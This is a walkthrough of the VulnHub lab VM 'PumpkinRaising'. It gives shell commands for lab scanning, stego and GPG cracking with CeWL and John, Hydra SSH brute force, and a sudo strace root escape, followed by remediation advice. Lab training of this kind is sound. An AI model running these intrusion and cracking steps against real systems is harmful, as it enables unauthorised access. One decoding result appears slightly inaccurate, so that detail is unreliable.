# VulnHub Mission Pumpkin v1.0 (2/3): PumpkinRaising — Walkthrough

Alright guys!! Four pumpkin seeds hidden across stego images, morse code, GPG-encrypted files, and a PCAP dump — and you need to plant them in the right order to get a shell. That's the PumpkinRaising challenge for you: it's not your usual boot2root, it's an obstacle course that punishes impatience and rewards careful attention to every single hint the author dropped. ( ͡° ͜ʖ ͡°)

Big thanks to Jayanth for designing a challenge that forces you to actually read what's in front of you. Every breadcrumb matters here.

---

| Field | Value |
|-------|-------|
| **Level** | Beginner |
| **Target VM** | Mission-Pumpkin v1.0: PumpkinRaising |
| **Attacker VM** | Kali Linux 2019.1 |
| **VulnHub** | https://www.vulnhub.com/entry/mission-pumpkin-v10-pumpkinraising,324/ |
| **Techniques** | Host discovery, Nmap enumeration, web source analysis, Base64/Base32/Hex/Morse decoding, PCAP analysis, steganography (StegoSuite), GPG cracking (JtR + CeWL), SSH login, rbash escape via strace (SUDO) |
| **CVEs** | N/A (logic and configuration challenges, no CVE-rated exploits) |

> **Hints from the author:**
> "Identify 4 pumpkin seeds (4 Flags — Seed ID's) and gain access to root and capture final Flag.txt file."
> "Remember Jack? He is the only expert we have in raising healthy Pumpkins."

---

## Attack Summary

```
[host-discovery: IP shown at VM boot banner]
    |
    v
[nmap: port 22/SSH + port 80/HTTP, robots.txt reveals paths]
    |
    v
[web source analysis: /pumpkin.html, Base32 -> spy.pcap -> strings -> Seed ID 50609]
    |
    v
[hex comment in /pumpkin.html (line 148) -> Seed ID 96454]
    |
    v
[underconstruction.html -> jackolantern.gif -> StegoSuite + note.txt passwords -> Seed ID 86568]
    |
    v
[robots.txt: seed.txt.gpg -> CeWL + JtR custom rules -> SEEDWATERSUNLIGHT -> Morse -> Seed ID 69507]
    |
    v
[assemble seeds in correct order: 69507506099645486568 -> SSH as jack]
    |
    v
[rbash + strace SUDO -> privilege escalation to root]
    |
    v
[/root/Flag.txt]
```

---

## Methodology

1. Host discovery via VM boot banner (no need for arp-scan on this one)
2. Nmap full port scan with OS/version/script detection
3. Web application source analysis: four hidden encoding layers (Base64, Base32, Hex, Morse)
4. PCAP file analysis via `strings` to extract Seed ID 1
5. Steganography extraction from GIF using StegoSuite with brute-forced password
6. GPG file cracking using CeWL wordlist + John the Ripper with custom rules
7. Assembling the four Seed IDs in the correct order for SSH credentials
8. Restricted shell (rbash) escape via strace with sudo privileges

---

## Step 1 — Identifying the Target

No arp-scan needed here. This VM is kind enough to display its IP address directly on the boot banner. Legit convenience. Once the VM starts, you will see something like:

```
This machine is up and running at
192.168.10.102
```

If you are on a different network segment, you can always confirm with:

```bash
arp-scan --localnet --ignoredups
# or
nmap -sn -T5 192.168.X.0/24
```

For this walkthrough, the target is `192.168.10.102`. Let's roll.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Step 2 — Reconnaissance and Service Enumeration

Time to see what this pumpkin is hiding:

```bash
nmap -A -T4 -p- 192.168.10.102
# -A: OS detection, service version, default scripts
# -T4: aggressive timing, fine for local labs
# -p-: all 65535 ports
```

Expected output:

```
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
80/tcp open  http    Apache httpd
```

Two services: SSH on 22 and HTTP on 80. The Nmap scan already does something nice here: it reads `robots.txt` and surfaces some interesting paths. Note those down, we'll need them later.

Two attack surfaces. Web first, SSH second (once we have credentials).

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.002 Active Scanning: Vulnerability Scanning] [T1046 Network Service Discovery]

---

## Step 3 — Web Application Analysis

Open the page at `http://192.168.10.102/` in a browser, or use curl if you prefer the terminal:

```bash
curl -s "http://192.168.10.102/"
```

The page shows four pumpkin images. Hovering over each one reveals a name: Big Max, Jack-Be-Little, Acorn, and Lil' Pump-Ke-Mon. Remember these names. They come back later when we need to order the seed IDs.

There is also this paragraph on the page:

> "To raise Pumpkins, we need to collect seeds at the first step. Remember Jack? He is the only expert we have in raising healthy Pumpkins."

So: four pumpkins, four names, four seeds to find. Jack is the target user. Got it.

Now let's look at the source code. This is where the real fun starts:

```bash
curl -s "http://192.168.10.102/" | grep -n "."
# or just use View Source in browser
```

Line 41 contains a Base64 comment:

```html
<!-- VGhpcyBpcyBqdXN0IHRvIHJlbWFpbmQgeW91IHRoYXQgaXQncyBMZXZlbCAyIG9mIE1pc3Npb24tUHVtcGtpbiEgOyk= -->
```

Decode it:

```bash
echo "VGhpcyBpcyBqdXN0IHRvIHJlbWFpbmQgeW91IHRoYXQgaXQncyBMZXZlbCAyIG9mIE1pc3Npb24tUHVtcGtpbiEgOyk=" | base64 -d
```

Output: `This is just to remind you that it's Level 2 of Mission-Pumpkin! ;)` — nothing actionable, just flavor text. But line 16 has a link: `/pumpkin.html`. That's our next stop.

> **MITRE ATT&CK:** [TA0007 Discovery] [T1518 Software Discovery] [T1083 File and Directory Discovery]

---

## Step 4 — Hunting the Seed IDs

### Seed ID 1: Jack-Be-Little (PCAP via Base32)

Open `/pumpkin.html`:

```bash
curl -s "http://192.168.10.102/pumpkin.html" | head -20
```

Line 12 contains a Base32-encoded comment:

```
F5ZWG4TJOB2HGL3TOB4S44DDMFYA====
```

Decode it:

```bash
echo "F5ZWG4TJOB2HGL3TOB4S44DDMFYA====" | base32 -d
```

Output: `http://192.168.10.102/scripts/spy.pcap`

Noice. Download and inspect the capture file:

```bash
wget -c http://192.168.10.102/scripts/spy.pcap
strings spy.pcap
```

No need to open Wireshark for this one. The `strings` command dumps all readable text from the binary file, and it's all there in plain sight:

```
Hey Jack, Robert has given me your contact. I'm sure I have the seeds that you want
Hi Mark, I'm greatful that you have the seeds
Please share the seed ID so that I can get you exact seeds
Sure, 50609 is the ID
```

**Jack-Be-Little Pumpkin Seed ID: 50609** ᕕ( ᐛ )ᕗ

> **Real-world note:** PCAP files containing cleartext credentials or sensitive data in plain TCP streams are a common finding in internal network pen tests. This exact pattern — sensitive data exchanged over unencrypted channels — was a factor in multiple enterprise breaches. Tools like Wireshark, tcpdump, and `strings` are the first things an attacker runs after grabbing a network capture. Reference: NIST SP 800-52 on encryption requirements.

> **MITRE ATT&CK:** [TA0006 Credential Access] [T1040 Network Sniffing]

---

### Seed ID 2: Acorn Pumpkin (Hex in page source)

Scroll to line 148 of `/pumpkin.html` — or just dump the full source with curl and look for content after many blank lines:

```bash
curl -s "http://192.168.10.102/pumpkin.html"
# scroll all the way down, or pipe to grep for hex patterns
```

There is a block of hexadecimal content buried at the bottom of the page. Convert it to ASCII:

```bash
echo "YOURHEXSTRINGHERE" | xxd -r -p
```

Output reveals a message with:

**Acorn Pumpkin Seed ID: 96454** •̀ᴗ•́

Also embedded in the message is a critical hint: `Do, remember to inform Jack to plant all 4 seeds in the same order.` Keep that in mind.

> **MITRE ATT&CK:** [TA0007 Discovery] [T1083 File and Directory Discovery]

---

### Seed ID 3: Lil' Pump-Ke-Mon (Steganography via GIF)

Still on `/pumpkin.html`, line 18 contains another link: `underconstruction.html`.

```bash
curl -s "http://192.168.10.102/underconstruction.html"
```

The page is not very helpful on the surface. But line 25 contains an obfuscated hint:

```
jackolantern dot GraphicsInterchangeFormat is under images
```

Parse that out: `/images/jackolantern.gif`. Download it:

```bash
wget http://192.168.10.102/images/jackolantern.gif
```

Attempting extraction with StegoSuite asks for a password:

```bash
stegosuite -x jackolantern.gif
# Password required!
```

Where do we get passwords? From `robots.txt`. Nmap already revealed two interesting files:

```
/hidden/note.txt
/seeds/seed.txt.gpg
```

```bash
wget http://192.168.10.102/hidden/note.txt
wget http://192.168.10.102/seeds/seed.txt.gpg
```

`note.txt` contains what looks like username:password pairs:

```
robert : C@43r0VqG2=
mark   : Qn@F5zMg4T
goblin : 79675-06172-65206-17765
```

Now brute-force the stego extraction with all passwords from the file:

```bash
for i in $(gawk -F" : " '{ print $2 }' note.txt | sed '/^$/d'); do
    stegosuite -x jackolantern.gif -k $i
done
```

One of those passwords works. A new file appears in the current directory: `decorative.txt`. Read it:

```bash
cat decorative.txt
```

Output: `Fantastic!!! looking forward for your presence in pumpkin party. Lil' Pump-Ke-Mon Pumpkin seeds ID : 86568`

**Lil' Pump-Ke-Mon Seed ID: 86568** (☞ﾟヮﾟ)☞

> **What is steganography?** Steganography is the practice of hiding data inside other data. In this case, a secret message was embedded in the pixel data of a GIF image. Unlike encryption (which makes data unreadable), steganography hides the fact that the data even exists. In CTFs this is classic. In the real world, attackers have used image steganography for covert C2 communication. APT32 (OceanLotus) has used image files to hide payloads in targeted campaigns.
> Reference: https://attack.mitre.org/techniques/T1027/

> **MITRE ATT&CK:** [TA0005 Defense Evasion] [T1027 Obfuscated Files or Information]

---

### Seed ID 4: Big Max Pumpkin (GPG + Morse Code)

The GPG-encrypted file at `seed.txt.gpg` is our remaining target. Trying the passwords from `note.txt` directly does not work:

```bash
for i in $(gawk -F" : " '{ print $2 }' note.txt | sed '/^$/d'); do
    gpg --batch --passphrase "$i" seed.txt.gpg
done
# Nothing. Time to build a better wordlist.
```

**Building a custom wordlist with CeWL:**

```bash
cewl -d0 -w wordsPumpkin.txt http://192.168.10.102/
cat wordsPumpkin.txt | tail
# Notice the last few entries: SEED, WATER, SUNLIGHT — all caps, stands out
```

The footer of the main page uses those three words: `SEED`, `WATER`, `SUNLIGHT`. That's the pattern. Create a custom John the Ripper rule in `/etc/john/john.conf` after `[List.Rules:None]`:

```
[List.Rules:Pumpkin]
$S$E$E$D
$W$A$T$E$R
$S$U$N$L$I$G$H$T
```

Apply the rule multiple times to generate combinations:

```bash
for i in {1..3}; do
    john -w=wordsPumpkin.txt --rules=Pumpkin --stdout >> wordsPumpkin.txt
done
```

Extract the GPG hash for John:

```bash
gpg2john seed.txt.gpg > hashGPGpumpkin
```

Crack it:

```bash
john hashGPGpumpkin --wordlist=wordsPumpkin.txt
```

Wow guys!! The password is `SEEDWATERSUNLIGHT`. Now decrypt the file:

```bash
gpg --batch --passphrase SEEDWATERSUNLIGHT seed.txt.gpg
cat seed.txt
```

The content is in Morse code. The hint in `/pumpkin.html` was: `Jack used to purchase seeds from the best-sellers and Morse is one among them.`

Decode the Morse at https://morsify.net or with any morse decoder tool.

**Big Max Pumpkin Seed ID: 69507** ಠᴗಠ

> **MITRE ATT&CK:** [TA0006 Credential Access] [T1110.001 Brute Force: Password Guessing]

---

## Step 5 — Assembling the Credentials

We have all four seeds:

| Pumpkin | Seed ID |
|---------|---------|
| Big Max | 69507 |
| Jack-Be-Little | 50609 |
| Acorn | 96454 |
| Lil' Pump-Ke-Mon | 86568 |

The hint said: plant them in the same order they appear on the main page. Looking at the homepage, the visual order is: Big Max, Jack-Be-Little, Acorn, Lil' Pump-Ke-Mon.

Final credentials:

```
Username: jack
Password: 69507506099645486568
```

Build a credentials file for Hydra:

```bash
# note.txt with jack added:
cat > note.txt << 'EOF'
robert : C@43r0VqG2=
mark : Qn@F5zMg4T
goblin : 79675-06172-65206-17765
jack : 69507506099645486568
EOF

gawk -F" : " '{ print $1 }' note.txt > usuarios.txt
gawk -F" : " '{ print $2 }' note.txt > senhas.txt

hydra -L usuarios.txt -P senhas.txt 192.168.10.102 ssh -I -F
```

SSH in:

```bash
ssh jack@192.168.10.102
```

You are in as jack. ᕕ( ᐛ )ᕗ

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1078 Valid Accounts] [T1021.004 Remote Services: SSH]

---

## Step 6 — Privilege Escalation via strace (SUDO + rbash escape)

Landing in the shell, you will notice something: this is `rbash` (restricted bash). Some commands will be blocked, but the `PATH` variable still includes `strace`. Check what sudo allows:

```bash
sudo -l
```

Expected output shows that ANY user can run `strace` without a password. That's all we need.

```bash
# GTFOBins strace sudo escape:
sudo strace -o /dev/null /bin/bash
```

Or more explicitly:

```bash
sudo strace -e trace=/ /bin/sh
```

Root shell. ¯\_(ツ)_/¯ Classic GTFOBins.

> **What is strace?** `strace` is a Linux diagnostic tool that traces system calls made by a process. When allowed via sudo, an attacker can use it as a wrapper to launch any other process as root, bypassing the restricted shell entirely.
> Reference: https://gtfobins.github.io/gtfobins/strace/

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/Flag.txt
```

**Root flag captured.** (☞ﾟヮﾟ)☞

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching]

> **GTFOBins reference:**
> https://gtfobins.github.io/gtfobins/strace/

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| Seed ID 1 | `50609` | `spy.pcap` (strings) | Jack-Be-Little |
| Seed ID 2 | `96454` | `/pumpkin.html` (hex comment line 148) | Acorn |
| Seed ID 3 | `86568` | `jackolantern.gif` (steganography) | Lil' Pump-Ke-Mon |
| Seed ID 4 | `69507` | `seed.txt.gpg` (Morse after GPG decrypt) | Big Max |
| Credential | `jack:69507506099645486568` | assembled from ordered seeds | SSH login |
| Credential | `robert:C@43r0VqG2=` | `/hidden/note.txt` | reference only |
| Credential | `mark:Qn@F5zMg4T` | `/hidden/note.txt` | reference only |
| GPG passphrase | `SEEDWATERSUNLIGHT` | CeWL + JtR custom rule | seed.txt.gpg |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | Sensitive data transmitted in cleartext over TCP | Common in legacy internal systems (HTTP APIs, telnet, old FTP services) | Always enforce encryption in transit; TLS everywhere, not just on login pages |
| 2 | Sudo privileges granted to a diagnostic tool (strace) with no password requirement | Misconfigured sudo policies appear constantly in enterprise Linux hardening audits | Follow principle of least privilege; sudo should never grant access to arbitrary exec wrappers |
| 3 | Password derivable from public page content (SEEDWATERSUNLIGHT from footer text) | Social engineering and OSINT frequently recover passwords derived from public brand content | Passwords must not be based on any publicly visible string associated with the system or company |
| 4 | Steganography used to hide credentials in a publicly accessible image | APT groups have used image steganography to hide C2 communications | Inspect all binary assets on public-facing servers during incident response; stego is not just a CTF trick |

**Why does this matter outside the lab?**

The sudo misconfiguration here (strace available to all users without password) mirrors a pattern found in real enterprise audits. The CIS Benchmark for Linux explicitly prohibits granting sudo to diagnostic or tracing tools. In the 2020 SolarWinds compromise, attackers moved laterally using misconfigured service accounts with excessive sudo rights — not CVEs, just config. The habit of testing `sudo -l` immediately after gaining any shell access is one of the most productive habits a pentester can develop, and it pays dividends in real engagements at least as often as in CTFs.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Credential Access | TA0006 | Network Sniffing (PCAP analysis) | T1040 |
| Credential Access | TA0006 | Brute Force: Password Guessing (GPG) | T1110.001 |
| Defense Evasion | TA0005 | Obfuscated Files or Information (stego/encoding) | T1027 |
| Initial Access | TA0001 | Valid Accounts | T1078 |
| Initial Access | TA0001 | External Remote Services (SSH) | T1133 |
| Privilege Escalation | TA0004 | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Collection | TA0009 | Data from Local System (flag) | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Remove strace (and similar diagnostic tools) from any sudo policy that does not explicitly require it and is not limited to specific named administrators
2. Encrypt all TCP services handling sensitive data; cleartext protocols (plain FTP, plain HTTP with credentials) must be replaced by TLS equivalents
3. Never derive passwords from content visible in the application's own UI (footer text, page titles, brand slogans)
4. Audit all public-facing binary assets for embedded steganographic content as part of incident response
5. Replace GPG passwords based on guessable patterns with randomly generated secrets stored in a proper secrets manager (HashiCorp Vault, AWS Secrets Manager)

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Revoke and reissue any SSH credential that used a pattern-based password
- Remove all overly permissive sudo rules and regenerate `/etc/sudoers.d/` from a hardened baseline
- Rotate all credentials found in cleartext files on the server
- Review all binary assets served publicly for embedded data

**MITRE D3FEND countermeasures:**
- D3-MFA (Multi-factor Authentication) for all remote access services to supplement credential-based login
- D3-OPS (OS Process Sandboxing) to limit the blast radius of any process running with elevated privileges
- D3-SJA (Scheduled Job Analysis) as a complementary hardening step alongside sudo audits

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Maintain an accurate inventory of all services and their exposed credentials
- Protect (PR.AC-4): Privileged access management; enforce least privilege on sudo policies
- Detect (DE.CM-7): Monitor for unusual use of system diagnostic tools (strace, ltrace, gdb) by non-root accounts
- Respond (RS.MI-1): Isolate affected systems and rotate all credentials immediately upon compromise detection
- Recover (RC.RP-1): Restore systems to known-good state from verified backups

**NIST SP 800-53 (Rev. 5) Controls:**
- AC-6: Least Privilege — restrict sudo to minimum necessary
- IA-5: Authenticator Management — prohibit pattern-derived passwords
- SC-8: Transmission Confidentiality and Integrity — enforce TLS
- SI-7: Software, Firmware, and Information Integrity — detect unauthorized embedded data in assets

**CISA Known Exploited Vulnerabilities:**
- No direct CVE match for this challenge; techniques are configuration-based
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: ACCESS
- Practice: Identity and Access Management — enforce least privilege, review sudo policy quarterly
- Target MIL: MIL-2

---

## Final Thoughts

Thanks to Jayanth for building a challenge where you genuinely have to pay attention. Every single hint in the HTML source, in the Morse-encoded GPG output, in the footer keywords — none of it is there by accident. This VM is a masterclass in teaching players to slow down, read carefully, and trust the clues.

Outside the lab: the techniques here look toy-ish on the surface (Morse code? Pumpkin seeds?), but the underlying skills — PCAP analysis, steganography detection, GPG cracking, sudo policy auditing — are absolutely real-world skills. Anyone doing internal pen tests or Linux hardening assessments will encounter sudo misconfigurations and cleartext credential exposure far more often than they will encounter fancy kernel exploits.

If this walkthrough helped you crack the pumpkins, share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

> Original article in Portuguese by André Henrique: https://medium.com/@mrhenrike

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
